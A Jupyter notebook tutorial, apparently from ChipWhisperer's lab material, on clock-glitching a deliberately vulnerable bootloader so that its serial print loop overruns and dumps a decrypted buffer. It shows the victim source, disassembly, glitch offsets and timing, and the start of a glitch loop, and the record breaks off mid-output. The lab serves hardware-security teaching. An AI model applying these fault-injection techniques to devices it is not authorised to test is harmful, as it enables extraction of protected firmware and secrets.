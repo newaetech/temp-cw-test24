{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Glitch Buffer Attacks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This tutorial discusses a specific type of glitch attack. It shows how a simple printing loop can be abused, causing a target to print some otherwise private information. This attack will be used to recover a plaintext without any knowledge of the encryption scheme being used."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Parameters\n",
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEARM'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This section introduces the attack concept by showing some real world examples of vulnerable firmware. Then, it describes the victim firmware that will be used in this tutorial."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Real Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Typically, one of the slowest parts of an embedded system is its communication lines. It's pretty common to see a processor running in the MHz range with a serial connection of 9.6k baud. To make these two different speeds work together, embedded firmware usually fills up a buffer with data and lets a serial driver print on its own time. This setup means we can expect to see code like:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < number_of_bytes_to_print; i++)\n",
    "{\n",
    "    print_one_byte_to_serial(buffer[i]);\n",
    "}\n",
    "```\n",
    "\n",
    "This is a pretty vulnerable piece of C. Imagine that we could sneak into the source code and change it to:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < really_big_number; i++)\n",
    "{\n",
    "    print_one_byte_to_serial(buffer[i]);\n",
    "}\n",
    "```\n",
    "\n",
    "C compilers don't care that `buffer[]` has a limited size - this loop will happily print every byte it comes across, which could include other variables, registers, and even source code. Although we probably don't have a good way of changing the source code on the fly, we do have glitches: a well-timed clock or power glitch could let us skip the `i < number_of_bytes_to_print` check, which would have the same result.\n",
    "\n",
    "How could this be applied? Imagine that we have an encrypted firmware image that we're going to transmit to a bootloader. A typical communication process might look like:\n",
    "\n",
    "1. We send the encrypted image ciphertexts over a serial connection\n",
    "1. The bootloader decrypts the ciphertexts and stores the result somewhere in memory\n",
    "1. The bootloader sends back a response over the serial port\n",
    "\n",
    "We have a pretty straightforward attack for this type of bootloader. During the last step, we'll apply a glitch at precisely the right time, causing the bootloader to print all kinds of things to the serial connection. With some luck, we'll be able to find the decrypted plaintext somewhere in this memory dump."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Building Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For this tutorial, a very simple bootloader using the SimpleSerial protocol has been set up. The source for this bootloader can be found in `chipwhisperer/hardware/victims/firmware/bootloader-glitch`. The following commands are used:\n",
    "\n",
    "* `pABCD\\n`: Send an encrypted ciphertext to the bootloader. For example, this message is made up of the two bytes AB and CD.\n",
    "* `r0\\n\\n\\n\\n\\n\\n`: The reply from the bootloader. Acknowledges that a message was received. No other responses are used.\n",
    "* `x`: Clear the bootloader's received buffer.\n",
    "* `k`: See x.\n",
    "\n",
    "The bootloader uses triple-ROT-13 encryption to encrypt/decrypt the messages. To help you send messages to the target, the script private/encrypt.py prints the SimpleSerial command for a given fixed string. For example, the ciphertext for the string `Don't forget to buy milk!` is\n",
    "\n",
    "```\n",
    "p516261276720736265747267206762206f686c207a76797821\\n\n",
    "```\n",
    "\n",
    "Now that we've got some basic knowledge of the target code, build it, then navigate to the `bootloader-glitch` firmware directory:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "rm -f -- bootloader-CWLITEARM.hex\r\n",
      "rm -f -- bootloader-CWLITEARM.eep\r\n",
      "rm -f -- bootloader-CWLITEARM.cof\r\n",
      "rm -f -- bootloader-CWLITEARM.elf\r\n",
      "rm -f -- bootloader-CWLITEARM.map\r\n",
      "rm -f -- bootloader-CWLITEARM.sym\r\n",
      "rm -f -- bootloader-CWLITEARM.lss\r\n",
      "rm -f -- objdir/*.o\r\n",
      "rm -f -- objdir/*.lst\r\n",
      "rm -f -- bootloader.s decryption.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s\r\n",
      "rm -f -- bootloader.d decryption.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d\r\n",
      "rm -f -- bootloader.i decryption.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i\r\n",
      ".\r\n",
      "-------- begin --------\r\n",
      "arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]\r\n",
      "Copyright (C) 2017 Free Software Foundation, Inc.\r\n",
      "This is free software; see the source for copying conditions.  There is NO\r\n",
      "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\n",
      "\r\n",
      ".\r\n",
      "Compiling C: bootloader.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/bootloader.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/bootloader.o.d bootloader.c -o objdir/bootloader.o \r\n",
      ".\r\n",
      "Compiling C: decryption.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/decryption.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/decryption.o.d decryption.c -o objdir/decryption.o \r\n",
      ".\r\n",
      "Compiling C: .././hal/stm32f3/stm32f3_hal.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o \r\n",
      ".\r\n",
      "Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o \r\n",
      ".\r\n",
      "Compiling C: .././hal/stm32f3/stm32f3_sysmem.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o \r\n",
      ".\r\n",
      "Assembling: .././hal/stm32f3/stm32f3_startup.S\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o\r\n",
      ".\r\n",
      "Linking: bootloader-CWLITEARM.elf\r\n",
      "arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/bootloader.o -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/bootloader-CWLITEARM.elf.d objdir/bootloader.o objdir/decryption.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/stm32f3_startup.o --output bootloader-CWLITEARM.elf --specs=nano.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=bootloader-CWLITEARM.map,--cref   -lm  \r\n",
      ".\r\n",
      "Creating load file for Flash: bootloader-CWLITEARM.hex\r\n",
      "arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature bootloader-CWLITEARM.elf bootloader-CWLITEARM.hex\r\n",
      ".\r\n",
      "Creating load file for EEPROM: bootloader-CWLITEARM.eep\r\n",
      "arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom=\"alloc,load\" \\\r\n",
      "\t--change-section-lma .eeprom=0 --no-change-warnings -O ihex bootloader-CWLITEARM.elf bootloader-CWLITEARM.eep || exit 0\r\n",
      ".\r\n",
      "Creating Extended Listing: bootloader-CWLITEARM.lss\r\n",
      "arm-none-eabi-objdump -h -S -z bootloader-CWLITEARM.elf > bootloader-CWLITEARM.lss\r\n",
      ".\r\n",
      "Creating Symbol Table: bootloader-CWLITEARM.sym\r\n",
      "arm-none-eabi-nm -n bootloader-CWLITEARM.elf > bootloader-CWLITEARM.sym\r\n",
      "Size after:\r\n",
      "   text\t   data\t    bss\t    dec\t    hex\tfilename\r\n",
      "   4420\t    120\t   1296\t   5836\t   16cc\tbootloader-CWLITEARM.elf\r\n",
      "+--------------------------------------------------------\r\n",
      "+ Built for platform CW-Lite Arm (STM32F3)\r\n",
      "+--------------------------------------------------------\r\n"
     ]
    }
   ],
   "source": [
    "%%bash -s \"$PLATFORM\"\n",
    "cd ../../hardware/victims/firmware/bootloader-glitch\n",
    "make PLATFORM=$1 CRYPTO_TARGET=NONE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Attack Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The Sensitive Code"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Inside `bootloader.c`, there are two buffers that are used to store most of the important data. The source code shows:\n",
    "```C\n",
    "#define DATA_BUFLEN 40\n",
    "#define ASCII_BUFLEN (2 * DATA_BUFLEN)\n",
    "\n",
    "uint8_t ascii_buffer[ASCII_BUFLEN];\n",
    "uint8_t data_buffer[DATA_BUFLEN];\n",
    "```\n",
    "\n",
    "This tells us that there will be two arrays stored somewhere in the target's memory. The AVR-GCC compiler doesn't usually try too hard to move these around, so we can expect to find them back-to-back in memory; that is, if we can read past the end of the ASCII buffer, we'll probably find the data buffer.\n",
    "\n",
    "Next, the code used to print a response to the serial port is:\n",
    "\n",
    "```C\n",
    "if(state == RESPOND)\n",
    "{\n",
    "\t// Send the ascii buffer back \n",
    "\ttrigger_high();\n",
    "\t\n",
    "\tint i;\n",
    "\tfor(i = 0; i < ascii_idx; i++)\n",
    "\t{\n",
    "\t\tputch(ascii_buffer[i]);\n",
    "\t}\n",
    "\ttrigger_low();\n",
    "\tstate = IDLE;\n",
    "}\n",
    "```\n",
    "\n",
    "This looks very similar to the example code given in the previous section, so it should be vulnerable to a glitching attack. The goal is to cause the loop to continue past its regular limit: `data_buffer[0]` is the same as `ascii_buffer[80]`, so a successful glitch should dump the data buffer for us."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Disassembly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As a final step, let's check the assembly code to see exactly what we're trying to glitch through. In the same folder as the hex file you built, open the `*.lss` file that corresponds to your target (for example, `bootloader-CWLITEARM.lss`). This is called a listing file, and it contains a bunch of debug and assembly information. Most importantly, it will allow us to easily match the source code to what's in our hex file. Search the file for something close to the vulnerable loop, such as `state == RESPOND`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Compiler Optimizations"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "While reading the section on the bootloader commands, you may have been surprised to see more than one newline at the end of the respond command (`r0\\n\\n\\n\\n\\n\\n`). Because the response is both so short and always the same length, the compiler will perform loop unrolling. Loop unrolling is an optimization that trades code size for speed by replacing a constant size loop:\n",
    "\n",
    "```C\n",
    "for (int i = 0; i < 3; i++) \n",
    "    do_something();\n",
    "```\n",
    "\n",
    "by a repeated sequence of the loop's operations:\n",
    "\n",
    "```C\n",
    "do_something();\n",
    "do_something();\n",
    "do_something();\n",
    "```\n",
    "\n",
    "For a small number of repititions, size-speed tradeoff is skewed towards the latter, making it very hard to get the compiler not to perform the optimization, thus we simply increase the size of the loop. Most bootloaders have multiple different reponses with varying length, so this isn't a typical obstacle you would face, but it is important for this situation.\n",
    "\n",
    "The [Wikipedia page on loop unrolling](https://en.wikipedia.org/wiki/Loop_unrolling) contains more information on the topic if you're like to learn more."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### XMEGA Disassembly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After searching the file, you should see something like this:\n",
    "\n",
    "```asm\n",
    " 38c:\t89 91       \tld\tr24, Y+\n",
    " 38e:\t0e 94 38 02 \tcall\t0x470\t; 0x470 <output_ch_0>\n",
    " 392:\tf0 e2       \tldi\tr31, 0x20\t; 32\n",
    " 394:\tc4 38       \tcpi\tr28, 0x84\t; 132\n",
    " 396:\tdf 07       \tcpc\tr29, r31\n",
    " 398:\tc9 f7       \tbrne\t.-14     \t; 0x38c <main+0xbc>\n",
    "\n",
    "```\n",
    "\n",
    "This is our printing loop in assembly. It has the following steps in it:\n",
    "\n",
    "* Look at the address `Y` and put the contents into `r24`. Increase the address stored in `Y`. (This is the i++ in the loop.)\n",
    "* Call the function in location `0x470`. Presumably, this is the location of the `putch()` function.\n",
    "* Compare `r28` and `r29` to `0x84` and `0x20`. Unless they're equal, go back to the top of the loop.\n",
    "\n",
    "There's one quirk to notice in this code. In the C source, the for loop checks whether `i < ascii_idx`. However, in the assembly code, the check is effectively whether `i == ascii_idx`! This is even easier to glitch - as long as we can break past the `brne` instruction once, we'll get to the data buffer."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Arm Disassembly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After searching the file, you should see something like this:\n",
    "\n",
    "```asm\n",
    " 8000268:\t5d28      \tldrb\tr0, [r5, r4]\n",
    " 800026a:\t3401      \tadds\tr4, #1\n",
    " 800026c:\tf000 f8f2 \tbl\t8000454 <putch>\n",
    " 8000270:\t2c08      \tcmp\tr4, #8\n",
    " 8000272:\td1f9      \tbne.n\t8000268 <main+0x64>\n",
    "```\n",
    "\n",
    "We can break this assembly down into the following steps:\n",
    "\n",
    "* Load the character we want to print into `r0` (`r5` contains the address of `ascii_buffer`, while `r4` is our loop index `i`)\n",
    "* Add 1 to `r4` (`i`)\n",
    "* Call `putch`\n",
    "* Compare `r4` to 8 (8 is always the value of `ascii_idx`)\n",
    "* Branch back to the beginning of the loop if `r4` and 8 aren't equal\n",
    "\n",
    "There's one quirk to notice in this code. In the C source, the for loop checks whether `i < ascii_idx`. However, in the assembly code, the check is effectively whether `i == ascii_idx`! This is even easier to glitch - as long as we can break past the `brne` instruction once, we'll get to the data buffer."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Attack Script"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we know what our target is, we can start creating our attack script. Basic setup is the same as usual:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"Helper_Scripts/Setup.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "fw_path = \"../../hardware/victims/firmware/bootloader-glitch/bootloader-{}.hex\".format(PLATFORM)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Detected known STMF32: STM32F302xB(C)/303xB(C)\n",
      "Extended erase (0x44), this can take ten seconds or more\n",
      "Attempting to programming 4539 bytes at 0x8000000\n",
      "STM32F Programming flash...\n",
      "STM32F Reading flash...\n",
      "Verified flash OK, 4539 bytes\n"
     ]
    }
   ],
   "source": [
    "cw.programTarget(scope, prog, fw_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And setup the glitch module:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == \"OPENADC\":\n",
    "    scope.glitch.clk_src = 'clkgen'\n",
    "    scope.glitch.trigger_src = 'ext_single'\n",
    "    scope.glitch.repeat = 1\n",
    "    scope.glitch.output = \"clock_only\"\n",
    "    scope.io.hs2 = \"glitch\"\n",
    "    if PLATFORM == \"CWLITEARM\":\n",
    "        scope.glitch.offset = -37.9\n",
    "        scope.glitch.width = -7\n",
    "    elif PLATFORM == \"CWLITEXMEGA\" or PLATFORM == \"CW303\":\n",
    "        scope.glitch.offset = -4.3\n",
    "        scope.glitch.width = 1.56\n",
    "elif SCOPETYPE == \"CWNANO\":\n",
    "    pass #do this later instead "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Communicating With Bootloader"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cwlite Device\n",
      "gain = \n",
      "    mode = low\n",
      "    gain = 45\n",
      "    db   = 22.50390625\n",
      "adc = \n",
      "    state      = False\n",
      "    basic_mode = rising_edge\n",
      "    timeout    = 2\n",
      "    offset     = 0\n",
      "    presamples = 0\n",
      "    samples    = 5000\n",
      "    decimate   = 1\n",
      "    trig_count = 298475802\n",
      "clock = \n",
      "    adc_src       = clkgen_x4\n",
      "    adc_phase     = 0\n",
      "    adc_freq      = 29538459\n",
      "    adc_rate      = 29538459.0\n",
      "    adc_locked    = True\n",
      "    freq_ctr      = 0\n",
      "    freq_ctr_src  = extclk\n",
      "    clkgen_src    = system\n",
      "    extclk_freq   = 10000000\n",
      "    clkgen_mul    = 2\n",
      "    clkgen_div    = 26\n",
      "    clkgen_freq   = 7384615.384615385\n",
      "    clkgen_locked = True\n",
      "trigger = \n",
      "    triggers = tio4\n",
      "    module   = basic\n",
      "io = \n",
      "    tio1       = serial_rx\n",
      "    tio2       = serial_tx\n",
      "    tio3       = high_z\n",
      "    tio4       = high_z\n",
      "    pdid       = high_z\n",
      "    pdic       = high_z\n",
      "    nrst       = high_z\n",
      "    glitch_hp  = False\n",
      "    glitch_lp  = False\n",
      "    extclk_src = hs1\n",
      "    hs2        = glitch\n",
      "    target_pwr = True\n",
      "glitch = \n",
      "    clk_src     = clkgen\n",
      "    width       = -7.03125\n",
      "    width_fine  = 0\n",
      "    offset      = -37.890625\n",
      "    offset_fine = 0\n",
      "    trigger_src = ext_single\n",
      "    arm_timing  = after_scope\n",
      "    ext_offset  = 0\n",
      "    repeat      = 1\n",
      "    output      = clock_only\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(scope)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we have our setup done, let's work on communicating with the bootloader. There's a few ways to do this, but the easiest is probably to use `target.ser.write` to send our text. Remember, to get to the print buffer, we need to send some `rot13` encoded text. For this example, we'll use `Don't forget to buy milk!`, whose `rot13` encoding is `516261276720736265747267206762206f686c207a76797821`.\n",
    "\n",
    "Let's also change the ADC clock from being x4 of the target clock to being x1. This way, we can easily use the ADC module (in particular `scope.adc.trig_count`) to see how long sending the response takes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == \"OPENADC\":\n",
    "    scope.clock.adc_src = \"clkgen_x1\"\n",
    "def send_milk(ser):\n",
    "    cmd = \"p516261276720736265747267206762206f686c207a76797821\\n\"\n",
    "    ser.write(cmd)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, let's send the command to the bootloader, observe the response, and measure how long it took. Unfortunately, the CWNANO board doesn't include this functionality. Instead, if you have an oscilloscope or logic analyzer on hand, you can use one of these instead to measure how long the trigger was high for."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "K`\u0004\u0000\u0001 \u0001\u0000\u0000\u0000r0\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "The response took 17014 cycles\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "\n",
    "scope.arm()\n",
    "send_milk(target.ser)\n",
    "time.sleep(0.1)\n",
    "scope.capture()\n",
    "num_chars = target.ser.inWaiting()\n",
    "response = target.ser.read(num_chars, timeout=50)\n",
    "print(response)\n",
    "response_type = 0\n",
    "if SCOPETYPE == \"OPENADC\":\n",
    "    response_time = scope.adc.trig_count\n",
    "    print(\"The response took {} cycles\".format(response_time))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this case, of the STM32F3 target, you should have an active trigger count of roughly 17014 cycles. Remember, we want to glitch the final few instructions of the loop, so our glitch point will be just before the end (say somewhere in the last 50 cycles). Some targets have better defined ranges where the glitch happens (the STM32F3, for example, always happens 21 cycles before the trigger goes low). We don't have this information for the CWNANO, but it should be about the same (say 17020 cycles):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "range(16992, 16995)\n"
     ]
    }
   ],
   "source": [
    "if SCOPETYPE == \"CWNANO\":\n",
    "    response_time = 17020\n",
    "if PLATFORM == \"CWLITEARM\" or PLATFORM == \"CW308_STM32F3\":\n",
    "    ext_range = range(response_time - 22, response_time - 19)\n",
    "elif PLATFORM == \"CWLITEXMEGA\" or PLATFORM == \"CW303\":\n",
    "    ext_range = range(response_time - 15, response_time - 0)\n",
    "else:\n",
    "    ext_range = range(response_time - 40, response_time)\n",
    "print(ext_range)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Glitch Loop "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We're almost ready to create our glitch loop! Before we do, there's a few things to keep in mind. The first is dealing with crashes. As you might expect, we'll often crash the target instead of getting the glitch we want. In this case, we'll need to reset the target before we try communicating with the bootloader. Luckily we can tell if we crashed the target by looking at the state of the trigger pin: if the target crashes, it will never go low (this also happens with a successful glitch, but we'll be checking for success in the response, so this isn't much of an issue). We can check this via `scope.adc.state`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This part is optional, but to make the response easier to read, we'll also want to do some parsing on the response text, since the response won't all be in ASCII text. This will make use of the `termcolor` module to make non letter/number responses red, which doesn't come with ChipWhisperer and only works on Jupyter/Unix. If you're following along in a Windows command prompt or don't want to install this module, feel free to remove the import and the `colored()` calls."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def my_print(text):\n",
    "    for ch in text:\n",
    "        if (ord(ch) > 31 and ord(ch) < 127) or ch == \"\\n\": \n",
    "            print(ch, end='')\n",
    "        else:\n",
    "            print(\"0x{:02X}\".format(ord(ch)), end='')\n",
    "        print(\"\", end='')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Our last step before proceeding to the attack loop is to active the glitch module:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == \"OPENADC\":\n",
    "    scope.glitch.output = \"clock_xor\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can finally proceed on to our actual loop. Our loop will have the same basic idea as the one from `Fault_1`: we'll need to iterate through ext_offset, offset, and width to find the right settings for a glitch.\n",
    "\n",
    "As was mentioned earlier, we'll also need to check for a successful glitch to avoid resetting while we're still receiving data. This will also enable us to read the full serial output, since the target will be sending back a lot of data (much more than we can receive in one `ser.read()`). \n",
    "\n",
    "Careful inspection of the source reveals that most of what we sent to the device is still in the `ascii_buffer` (with the first 8 or so characters being overwritten). That means we can check for one of the characters after the overwritten part (say `\"7\"`).\n",
    "\n",
    "After we're sure we have a glitch, we can just keep looking for more data and printing it.\n",
    "\n",
    "**Make sure you update the values in the `external offset range` call to reflect what you got earlier in the tutorial**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"Range = namedtuple('Range', ['min', 'max', 'step'])\\n\\noffset_range = Range(scope.glitch.offset, scope.glitch.offset + 5, 0.4)\\nwidth_range = Range(scope.glitch.width - 2, scope.glitch.width + 5, 0.4)\""
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"\"\"Range = namedtuple('Range', ['min', 'max', 'step'])\n",
    "\n",
    "offset_range = Range(scope.glitch.offset, scope.glitch.offset + 5, 0.4)\n",
    "width_range = Range(scope.glitch.width - 2, scope.glitch.width + 5, 0.4)\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Init\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "509505df64ec43e5810900fbb9749b6d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, description='width', max=40, style=ProgressStyle(description_width='initia…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "89d196a9f95941559b5443565ecdc752",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, description='offset', max=40, style=ProgressStyle(description_width='initi…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "844390139f264df9bda4d4ba77af68a8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
